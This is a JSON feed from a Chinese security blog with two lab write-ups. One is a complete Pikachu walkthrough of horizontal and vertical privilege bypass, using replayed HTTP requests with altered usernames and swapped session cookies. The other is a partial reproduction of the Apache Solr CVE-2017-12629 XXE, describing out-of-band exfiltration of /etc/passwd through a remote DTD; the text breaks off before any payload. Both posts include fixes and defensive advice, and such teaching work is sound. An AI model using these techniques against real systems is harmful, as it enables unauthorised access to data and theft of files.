{
    "version": "https://jsonfeed.org/version/1",
    "title": "bae的博客 • All posts by \"漏洞分析\" category",
    "description": "bae的个人博客",
    "home_page_url": "https://bae-ace.github.io",
    "items": [
        {
            "id": "https://bae-ace.github.io/2025/08/02/Pikachu-%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E4%B8%8E%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/08/02/Pikachu-%E9%9D%B6%E5%9C%BA%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83%E4%B8%8E%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%89/",
            "title": "Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）",
            "date_published": "2025-08-02T10:00:32.000Z",
            "content_html": "<h1 id=\"Pikachu-靶场：权限绕过漏洞（水平越权与垂直越权）\"><a href=\"#Pikachu-靶场：权限绕过漏洞（水平越权与垂直越权）\" class=\"headerlink\" title=\"Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）\"></a>Pikachu 靶场：权限绕过漏洞（水平越权与垂直越权）</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p><strong>权限绕过漏洞</strong>是 Web 应用中常见的安全问题，分为<strong>水平越权</strong>和<strong>垂直越权</strong>两种类型。这类漏洞源于后端未对用户权限进行严格校验，允许攻击者访问未授权的数据或执行受限操作。本文基于 <strong>Pikachu 靶场</strong> 的 <strong>Over Permission 模块</strong>，详细讲解水平越权和垂直越权的成因、危害、利用方式及修复方法，旨在帮助安全从业者和开发者深入理解并防范此类漏洞。</p>\n<hr>\n<h2 id=\"二、权限绕过漏洞概述\"><a href=\"#二、权限绕过漏洞概述\" class=\"headerlink\" title=\"二、权限绕过漏洞概述\"></a>二、权限绕过漏洞概述</h2><h3 id=\"1-什么是权限绕过漏洞？\"><a href=\"#1-什么是权限绕过漏洞？\" class=\"headerlink\" title=\"1. 什么是权限绕过漏洞？\"></a>1. 什么是权限绕过漏洞？</h3><p>权限绕过漏洞是指 Web 应用未正确验证用户权限，导致攻击者能够访问或操作超出其权限范围的资源或功能。按权限方向分为两种类型：</p>\n<table>\n<thead>\n<tr>\n<th>类型</th>\n<th>定义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>水平越权</strong></td>\n<td>普通用户 A 能访问普通用户 B 的资源或数据（如查看其他用户的隐私信息）</td>\n</tr>\n<tr>\n<td><strong>垂直越权</strong></td>\n<td>普通用户通过伪造参数，执行只有管理员才能完成的操作（如用户管理）</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-危害\"><a href=\"#2-危害\" class=\"headerlink\" title=\"2. 危害\"></a>2. 危害</h3><ul>\n<li><strong>水平越权</strong>：<ul>\n<li>泄露其他用户的敏感信息（如个人信息、订单记录）</li>\n<li>篡改其他用户的数据</li>\n</ul>\n</li>\n<li><strong>垂直越权</strong>：<ul>\n<li>执行管理功能（如创建&#x2F;删除用户、修改系统配置）</li>\n<li>完全控制 Web 应用</li>\n</ul>\n</li>\n<li><strong>潜在后果</strong>：<ul>\n<li>数据泄露</li>\n<li>系统功能滥用</li>\n<li>服务器被接管</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"三、靶场环境\"><a href=\"#三、靶场环境\" class=\"headerlink\" title=\"三、靶场环境\"></a>三、靶场环境</h2><h3 id=\"1-靶场信息\"><a href=\"#1-靶场信息\" class=\"headerlink\" title=\"1. 靶场信息\"></a>1. 靶场信息</h3><ul>\n<li><strong>地址</strong>：<code>http://192.168.147.137/pikachu/</code></li>\n<li><strong>监听端口</strong>：81</li>\n<li><strong>漏洞模块</strong>：<ul>\n<li><strong>水平越权</strong>：<code>/vul/overpermission/op1/</code></li>\n<li><strong>垂直越权</strong>：<code>/vul/overpermission/op2/</code></li>\n</ul>\n</li>\n<li><strong>测试工具</strong>：<ul>\n<li>Burp Suite（抓包与请求重放）</li>\n<li>浏览器（推荐 Firefox）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-用户信息\"><a href=\"#2-用户信息\" class=\"headerlink\" title=\"2. 用户信息\"></a>2. 用户信息</h3><table>\n<thead>\n<tr>\n<th>用户名</th>\n<th>密码</th>\n<th>角色</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>kobe</code></td>\n<td>（任意）</td>\n<td>普通用户</td>\n</tr>\n<tr>\n<td><code>lucy</code></td>\n<td>（任意）</td>\n<td>普通用户</td>\n</tr>\n<tr>\n<td><code>admin</code></td>\n<td><code>123456</code></td>\n<td>管理员</td>\n</tr>\n<tr>\n<td><code>pikachu</code></td>\n<td><code>000000</code></td>\n<td>普通用户</td>\n</tr>\n</tbody></table>\n<hr>\n<h2 id=\"四、水平越权漏洞实战-🎯\"><a href=\"#四、水平越权漏洞实战-🎯\" class=\"headerlink\" title=\"四、水平越权漏洞实战 🎯\"></a>四、水平越权漏洞实战 🎯</h2><h3 id=\"1-场景说明\"><a href=\"#1-场景说明\" class=\"headerlink\" title=\"1. 场景说明\"></a>1. 场景说明</h3><p>Pikachu 靶场的水平越权模块模拟了一个用户信息查询接口：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><br><span class=\"hljs-built_in\">GET</span> /vul/overpermission/op1/op1_mem.php?<span class=\"hljs-attribute\">username</span>=xxx<br><br></code></pre></td></tr></table></figure>\n\n<p>普通用户（如 <code>kobe</code>）登录后，可通过该接口查看自己的信息。但由于后端未验证请求参数 <code>username</code> 是否与当前用户匹配，攻击者可通过修改 <code>username</code> 参数，访问其他用户（如 <code>lucy</code>）的私有信息。</p>\n<h3 id=\"2-攻击步骤\"><a href=\"#2-攻击步骤\" class=\"headerlink\" title=\"2. 攻击步骤\"></a>2. 攻击步骤</h3><ol>\n<li><strong>登录 kobe 账户</strong>：<ul>\n<li>访问 <code>http://192.168.147.137:81/pikachu/</code>，使用 <code>kobe</code> 登录。</li>\n</ul>\n</li>\n<li><strong>抓取请求</strong>：<ul>\n<li>打开 Burp Suite，配置代理（默认：<code>127.0.0.1:8080</code>）。</li>\n<li>使用 Firefox 访问：</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs url\">http://192.168.147.137:81/vul/overpermission/op1/op1_mem.php?username=kobe<br></code></pre></td></tr></table></figure>\n<ul>\n<li>Burp 拦截到类似以下请求：<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/vul/overpermission/op1/op1_mem.php?username=kobe</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.147.137:81<br><span class=\"hljs-attribute\">Cookie</span><span class=\"hljs-punctuation\">: </span>PHPSESSID=&lt;kobe的session&gt;<br><span class=\"hljs-attribute\">User-Agent</span><span class=\"hljs-punctuation\">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64)<br><span class=\"hljs-attribute\">Accept</span><span class=\"hljs-punctuation\">: </span>text/html<br><span class=\"hljs-attribute\">Connection</span><span class=\"hljs-punctuation\">: </span>close<br></code></pre></td></tr></table></figure></li>\n</ul>\n<ol start=\"3\">\n<li><strong>修改参数</strong>：<ul>\n<li>在 Burp 的 Repeater 模块中，将 <code>username=kobe</code> 改为 <code>username=lucy</code>：<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">GET</span> /vul/overpermission/op1/op1_mem.php?<span class=\"hljs-attribute\">username</span>=lucy HTTP/1.1<br>Host: 192.168.147.137:81<br>Cookie: <span class=\"hljs-attribute\">PHPSESSID</span>=&lt;kobe的session&gt;<br><span class=\"hljs-built_in\">..</span>.<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><strong>发送请求</strong>：<ul>\n<li>点击发送，页面返回 <code>lucy</code> 的隐私数据（如邮箱、电话等）。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"3-安全问题\"><a href=\"#3-安全问题\" class=\"headerlink\" title=\"3. 安全问题\"></a>3. 安全问题</h3><ul>\n<li>后端直接信任 GET 参数 <code>username</code>，未验证是否与当前会话用户（<code>$_SESSION[&#39;user&#39;]</code>）匹配。</li>\n<li>缺乏用户身份校验，导致普通用户可访问任意用户的数据。</li>\n</ul>\n<h3 id=\"4-修复建议\"><a href=\"#4-修复建议\" class=\"headerlink\" title=\"4. 修复建议\"></a>4. 修复建议</h3><p>在后端添加用户身份校验逻辑，确保请求的用户与会话用户一致：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;user&#x27;</span>] != <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;username&#x27;</span>]) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;非法访问！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"五、垂直越权漏洞实战\"><a href=\"#五、垂直越权漏洞实战\" class=\"headerlink\" title=\"五、垂直越权漏洞实战\"></a>五、垂直越权漏洞实战</h2><h3 id=\"1-场景说明-1\"><a href=\"#1-场景说明-1\" class=\"headerlink\" title=\"1. 场景说明\"></a>1. 场景说明</h3><p>Pikachu 靶场的垂直越权模块模拟了一个管理员管理接口：</p>\n<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">POST <span class=\"hljs-regexp\">/vul/</span>overpermission<span class=\"hljs-regexp\">/op2/</span>op2_admin_edit.php<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>管理员</strong>（<code>admin</code> &#x2F; <code>123456</code>）可通过该接口创建或修改用户信息。</li>\n<li><strong>普通用户</strong>（<code>pikachu</code> &#x2F; <code>000000</code>）本应无权访问该接口。</li>\n<li>由于后端未验证用户角色，普通用户可伪造请求执行管理操作。</li>\n</ul>\n<h3 id=\"2-攻击流程\"><a href=\"#2-攻击流程\" class=\"headerlink\" title=\"2. 攻击流程\"></a>2. 攻击流程</h3><ol>\n<li><strong>登录普通用户 pikachu</strong>：<ul>\n<li>访问 <code>http://192.168.147.137:81/pikachu/</code>，使用 <code>pikachu</code> &#x2F; <code>000000</code> 登录。</li>\n</ul>\n</li>\n<li><strong>抓取管理员请求</strong>：<ul>\n<li><p>使用 <code>admin</code> 账户登录，访问管理接口，抓取 POST 请求：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">POST</span> <span class=\"hljs-string\">/vul/overpermission/op2/op2_admin_edit.php</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span class=\"hljs-punctuation\">: </span>192.168.147.137:81<br><span class=\"hljs-attribute\">Cookie</span><span class=\"hljs-punctuation\">: </span>PHPSESSID=&lt;admin的session&gt;<br><span class=\"hljs-attribute\">Content-Type</span><span class=\"hljs-punctuation\">: </span>application/x-www-form-urlencoded<br><span class=\"hljs-attribute\">Content-Length</span><span class=\"hljs-punctuation\">: </span>133<br><br><span class=\"language-dts\"><span class=\"hljs-attr\">username</span><span class=\"hljs-operator\">=</span>t3<span class=\"hljs-variable\">&amp;password</span>=<span class=\"hljs-number\">123456</span><span class=\"hljs-variable\">&amp;sex</span>=女<span class=\"hljs-variable\">&amp;phonenum</span>=<span class=\"hljs-number\">12345678908</span><span class=\"hljs-variable\">&amp;email</span>=t3@qq.com<span class=\"hljs-variable\">&amp;address</span>=北京<span class=\"hljs-variable\">&amp;submit</span>=创建</span><br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><strong>替换 Cookie</strong>：<ul>\n<li><p>在 Burp Repeater 中，将请求的 <code>Cookie</code> 替换为 <code>pikachu</code> 的会话：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\">Cookie: <span class=\"hljs-attribute\">PHPSESSID</span>=&lt;pikachu的session&gt;<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><strong>重放请求</strong>：<ul>\n<li>发送修改后的 POST 请求，观察响应。</li>\n<li>如果成功，系统创建新用户 <code>t3</code> 。</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"3-安全问题-1\"><a href=\"#3-安全问题-1\" class=\"headerlink\" title=\"3. 安全问题\"></a>3. 安全问题</h3><ul>\n<li>管理员功能接口仅由前端隐藏（如菜单不可见），后端未验证用户角色。</li>\n<li>普通用户通过伪造请求即可执行敏感操作（如创建用户）。</li>\n</ul>\n<h3 id=\"4-修复建议-1\"><a href=\"#4-修复建议-1\" class=\"headerlink\" title=\"4. 修复建议\"></a>4. 修复建议</h3><p>在后端添加角色校验逻辑，确保只有管理员可访问管理接口：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">&#x27;role&#x27;</span>] != <span class=\"hljs-string\">&#x27;admin&#x27;</span>) &#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;无权访问该接口！&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"六、漏洞原理总结\"><a href=\"#六、漏洞原理总结\" class=\"headerlink\" title=\"六、漏洞原理总结\"></a>六、漏洞原理总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>水平越权</th>\n<th>垂直越权</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞位置</strong></td>\n<td>用户间数据接口</td>\n<td>后台管理功能接口</td>\n</tr>\n<tr>\n<td><strong>攻击方式</strong></td>\n<td>修改 <code>username</code> 参数</td>\n<td>重放管理员请求，伪造普通用户身份</td>\n</tr>\n<tr>\n<td><strong>问题本质</strong></td>\n<td>未验证请求是否属于当前用户</td>\n<td>未验证用户是否具有管理员权限</td>\n</tr>\n<tr>\n<td><strong>危害</strong></td>\n<td>数据泄露</td>\n<td>非授权操作、管理功能滥用</td>\n</tr>\n<tr>\n<td><strong>修复重点</strong></td>\n<td>接口绑定用户身份校验</td>\n<td>严格校验接口访问者的角色</td>\n</tr>\n</tbody></table>\n<h3 id=\"1-成因\"><a href=\"#1-成因\" class=\"headerlink\" title=\"1. 成因\"></a>1. 成因</h3><ul>\n<li><strong>水平越权</strong>：后端信任用户输入（如 <code>username</code>），未校验与会话用户的一致性。</li>\n<li><strong>垂直越权</strong>：管理接口未验证用户角色，允许任意用户通过伪造请求访问。</li>\n</ul>\n<h3 id=\"2-利用方式\"><a href=\"#2-利用方式\" class=\"headerlink\" title=\"2. 利用方式\"></a>2. 利用方式</h3><ul>\n<li><strong>水平越权</strong>：通过修改 URL 参数（如 <code>username</code>），访问其他用户数据。</li>\n<li><strong>垂直越权</strong>：使用 Burp Suite 重放管理员请求，替换为普通用户的会话。</li>\n</ul>\n<h3 id=\"3-危害\"><a href=\"#3-危害\" class=\"headerlink\" title=\"3. 危害\"></a>3. 危害</h3><ul>\n<li><strong>水平越权</strong>：导致用户隐私泄露，可能引发后续社会工程学攻击。</li>\n<li><strong>垂直越权</strong>：可能导致系统完全失控，如创建恶意管理员账户。</li>\n</ul>\n<hr>\n<h2 id=\"七、防护建议\"><a href=\"#七、防护建议\" class=\"headerlink\" title=\"七、防护建议\"></a>七、防护建议</h2><ol>\n<li><p><strong>严格权限校验</strong></p>\n<ul>\n<li><strong>水平越权</strong>：确保请求参数与当前会话用户一致（如 <code>$_SESSION[&#39;user&#39;] == $_GET[&#39;username&#39;]</code>）。</li>\n<li><strong>垂直越权</strong>：验证用户角色，确保管理接口仅管理员可访问（如 <code>$_SESSION[&#39;role&#39;] == &#39;admin&#39;</code>）。</li>\n</ul>\n</li>\n<li><p><strong>最小权限原则</strong></p>\n<ul>\n<li>配置 Web 应用以最低权限运行，限制普通用户的功能访问。</li>\n<li>确保敏感接口（如用户管理）仅对特定角色开放。</li>\n</ul>\n</li>\n<li><p><strong>安全编码</strong></p>\n<ul>\n<li>对所有用户输入进行严格校验，防止参数篡改。</li>\n<li>使用安全的会话管理机制（如 CSRF 令牌）。</li>\n</ul>\n</li>\n<li><p><strong>部署 WAF</strong></p>\n<ul>\n<li>配置 Web 应用防火墙，拦截异常请求（如非法的 <code>username</code> 参数或未授权的管理请求）。</li>\n<li>使用正则规则检测可疑参数。</li>\n</ul>\n</li>\n<li><p><strong>日志监控</strong></p>\n<ul>\n<li>记录所有接口访问日志，监控异常的权限请求。</li>\n<li>定期审计日志，及时发现潜在越权行为。</li>\n</ul>\n</li>\n<li><p><strong>前端与后端协同</strong></p>\n<ul>\n<li>前端隐藏敏感功能（如管理员菜单），但不能仅依赖前端控制。</li>\n<li>后端必须独立验证所有请求的权限。</li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"八、总结\"><a href=\"#八、总结\" class=\"headerlink\" title=\"八、总结\"></a>八、总结</h2><table>\n<thead>\n<tr>\n<th>项目</th>\n<th>信息</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>漏洞类型</strong></td>\n<td>权限绕过（水平越权、垂直越权）</td>\n</tr>\n<tr>\n<td><strong>靶场</strong></td>\n<td>Pikachu（<code>http://192.168.147.137:81/pikachu/</code>）</td>\n</tr>\n<tr>\n<td><strong>漏洞模块</strong></td>\n<td><code>/vul/overpermission/op1/</code>（水平越权）<br> &#x2F;vul&#x2F;overpermission&#x2F;op2&#x2F;（垂直越权）</td>\n</tr>\n<tr>\n<td><strong>危害</strong></td>\n<td>数据泄露、未经授权的操作、系统失控</td>\n</tr>\n<tr>\n<td><strong>修复核心</strong></td>\n<td>用户身份校验、角色权限验证</td>\n</tr>\n</tbody></table>\n<p>Pikachu 靶场的 <strong>Over Permission 模块</strong> 通过模拟水平越权和垂直越权场景，展示了权限校验缺失的严重后果。水平越权允许普通用户访问其他用户数据，垂直越权则让普通用户执行管理员操作。通过本文的复现，读者可以深入理解越权漏洞的成因、利用方式及修复方法。开发者应在开发中始终遵循“后端校验优先”原则，结合 WAF 和日志监控，构建安全的 Web 应用。</p>\n<blockquote>\n<p><strong>免责声明</strong>：本文内容仅供安全研究和防护参考，请勿用于非法攻击活动。</p>\n</blockquote>\n",
            "tags": [
                "Web安全",
                "权限绕过",
                "水平越权",
                "垂e直越权",
                "Pikachu靶场"
            ]
        },
        {
            "id": "https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/",
            "url": "https://bae-ace.github.io/2025/08/01/Apache-Solr-CVE-2017-12629-XXE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%9F%BA%E4%BA%8E-Vulhub%EF%BC%89/",
            "title": "Apache Solr CVE-2017-12629 XXE 漏洞复现与利用（基于 Vulhub）",
            "date_published": "2025-08-01T09:54:17.000Z",
            "content_html": "<h1 id=\"深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）\"><a href=\"#深入剖析-Apache-Solr-CVE-2017-12629-XXE-漏洞（基于-Vulhub）\" class=\"headerlink\" title=\"深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）\"></a>深入剖析 Apache Solr CVE-2017-12629 XXE 漏洞（基于 Vulhub）</h1><h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p><strong>CVE-2017-12629</strong> 是一个影响 Apache Solr 的 **XML 外部实体注入（XXE）**漏洞，允许攻击者通过构造恶意的 XML 输入，加载外部实体或敏感文件，从而导致信息泄露或进一步攻击。该漏洞难度中等偏上，需要结合远程 DTD（文档类型定义）加载和外带技术进行利用。本文基于 <strong>Vulhub</strong> 靶场和 <strong>Kali Linux</strong> 环境，详细复现该漏洞，涵盖环境搭建、原理分析、利用流程及防护建议，旨在帮助安全从业者深入理解 XXE 漏洞的危害与利用方式。</p>\n<p>本文将重点讲解：</p>\n<ul>\n<li>漏洞触发原理及利用链</li>\n<li>远程 DTD 构造与外带攻击</li>\n<li>完整的攻击请求构造与验证</li>\n<li>防护措施与注意事项</li>\n</ul>\n<hr>\n<h2 id=\"二、漏洞概述\"><a href=\"#二、漏洞概述\" class=\"headerlink\" title=\"二、漏洞概述\"></a>二、漏洞概述</h2><ul>\n<li><strong>漏洞编号</strong>：CVE-2017-12629</li>\n<li><strong>漏洞类型</strong>：XXE（XML External Entity Injection）</li>\n<li><strong>影响版本</strong>：Apache Solr &lt; 7.1.0</li>\n<li><strong>测试平台</strong>：Vulhub + Kali Linux</li>\n<li><strong>难度</strong>：中等偏上（需构造远程 DTD 和外带攻击）</li>\n<li><strong>危害</strong>：<ul>\n<li>读取服务器敏感文件（如 <code>/etc/passwd</code>）</li>\n<li>触发内网资源访问，潜在导致 SSRF</li>\n<li>结合其他漏洞进一步提权或控制服务器</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2 id=\"三、环境搭建\"><a href=\"#三、环境搭建\" class=\"headerlink\" title=\"三、环境搭建\"></a>三、环境搭建</h2><h3 id=\"1-前提准备\"><a href=\"#1-前提准备\" class=\"headerlink\" title=\"1. 前提准备\"></a>1. 前提准备</h3><p>确保以下环境已就绪：</p>\n<ul>\n<li><strong>操作系统</strong>：Kali Linux</li>\n<li><strong>网络配置</strong>：<ul>\n<li>NAT 模式（访问外部网络）</li>\n<li>仅主机模式（Host-Only，Kali IP：<code>192.168.56.1</code>，靶机 IP：<code>192.168.56.102</code>）</li>\n</ul>\n</li>\n<li><strong>工具</strong>：<ul>\n<li>已安装 Docker 和 Docker Compose</li>\n<li>Burp Suite（用于抓包和构造请求）</li>\n<li>Python3（用于托管 DTD 文件）</li>\n</ul>\n</li>\n<li><strong>靶场</strong>：Vulhub 的 Apache Solr CVE-2017-12629 环境<ul>\n<li>访问地址：<code>http://192.168.56.102:8983/solr/#/</code></li>\n<li>确保靶场已成功部署（参考 Vulhub 官方文档或前文）</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2-启动-Vulhub-靶场\"><a href=\"#2-启动-Vulhub-靶场\" class=\"headerlink\" title=\"2. 启动 Vulhub 靶场\"></a>2. 启动 Vulhub 靶场</h3><ol>\n<li>克隆 Vulhub 项目（若未下载）：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/vulhub/vulhub.git<br><span class=\"hljs-built_in\">cd</span> vulhub/solr/CVE-2017-12629<br></code></pre></td></tr></table></figure></li>\n<li>启动 Docker 容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose up -d<br></code></pre></td></tr></table></figure></li>\n<li>验证环境：<ul>\n<li>访问 <code>http://192.168.56.102:8983/solr/#/</code>，若看到 Solr 管理界面，说明部署成功 。</li>\n</ul>\n</li>\n<li>管理容器：<ul>\n<li>查看容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker ps<br></code></pre></td></tr></table></figure></li>\n<li>停止容器：<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">docker-compose down<br></code></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<hr>\n<h2 id=\"四、漏洞原理\"><a href=\"#四、漏洞原理\" class=\"headerlink\" title=\"四、漏洞原理\"></a>四、漏洞原理</h2><h3 id=\"1-XXE-漏洞简介\"><a href=\"#1-XXE-漏洞简介\" class=\"headerlink\" title=\"1. XXE 漏洞简介\"></a>1. XXE 漏洞简介</h3><p>XXE（XML External Entity Injection）是一种 XML 解析器漏洞，攻击者通过注入恶意 XML 实体，诱导解析器加载外部资源（如本地文件或远程 DTD），从而实现文件读取或网络请求。Apache Solr 的查询接口允许用户提交 XML 格式的参数，且未禁用外部实体解析，导致 XXE 漏洞。</p>\n<h3 id=\"2-漏洞触发点\"><a href=\"#2-漏洞触发点\" class=\"headerlink\" title=\"2. 漏洞触发点\"></a>2. 漏洞触发点</h3><p>Solr 的漏洞入口位于以下接口：</p>\n<figure class=\"highlight dts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs dts\"><span class=\"hljs-keyword\">/solr/</span>demo/select?q=<span class=\"hljs-params\">&lt;XML_Payload&gt;</span><span class=\"hljs-variable\">&amp;wt</span>=xml<span class=\"hljs-variable\">&amp;</span>defT<span class=\"hljs-attr\">ype</span><span class=\"hljs-operator\">=</span>xmlparser<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li><strong>参数说明</strong>：<ul>\n<li><code>q</code>：查询参数，接受 XML 格式的输入。</li>\n<li><code>wt=xml</code>：指定响应格式为 XML。</li>\n<li><code>defType=xmlparser</code>：启用 XML 解析器，触发 XXE。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"3-漏洞限制\"><a href=\"#3-漏洞限制\" class=\"headerlink\" title=\"3. 漏洞限制\"></a>3. 漏洞限制</h3><ul>\n<li><strong>无回显</strong>：Solr 不直接回显实体内容（如 <code>/etc/passwd</code>），需通过外带（Out-of-Band, OOB）技术利用。</li>\n<li><strong>外带攻击</strong>：通过构造远程 DTD，诱导 Solr 访问攻击者控制的服务器，从而间接读取目标文件。</li>\n</ul>\n<h3 id=\"4-利用链\"><a href=\"#4-利用链\" class=\"headerlink\" title=\"4. 利用链\"></a>4. 利用链</h3><figure class=\"highlight crmsh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs crmsh\">用户提交 <span class=\"hljs-keyword\">XML</span> <span class=\"hljs-title\">Payload</span> -&gt; Solr <span class=\"hljs-keyword\">XML</span> <span class=\"hljs-title\">解析器解析 -&gt; 加载远程 DTD</span> -&gt; 引用本地文件（如 /etc/passwd） -&gt; 外带至攻击者服务器<br></code></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"五、漏洞利用流程\"><a href=\"#五、漏洞利用流程\" class=\"headerlink\" title=\"五、漏洞利用流程\"></a>五、漏洞利用流程</h2><h3 id=\"1-初步访问与抓包\"><a href=\"#1-初步访问与抓包\" class=\"headerlink\" title=\"1. 初步访问与抓包\"></a>1. 初步访问与抓包</h3><ol>\n<li>配置 Burp Suite：<ul>\n<li>打开 Burp Suite，设置代理（默认：<code>127.0.0.1:8080</code>）。</li>\n<li>配置 Firefox 浏览器使用 Burp 代理。</li>\n</ul>\n</li>\n<li>访问 Solr 管理界面：<figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs awk\">http:<span class=\"hljs-regexp\">//</span><span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">56.102</span>:<span class=\"hljs-number\">8983</span><span class=\"hljs-regexp\">/solr/</span><span class=\"hljs-comment\">#/</span><br></code></pre></td></tr></table></figure></li>\n<li>在 Burp 中拦截请求，观察典型 GET 请求：<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs http\"><span class=\"hljs-keyword\">GET</span> <span class=\"hljs-string\">/solr/</span> <span class=\"hljs-meta\">HTTP/1.1</span><br><span class=\"hljs-attribute\">Host</span><span 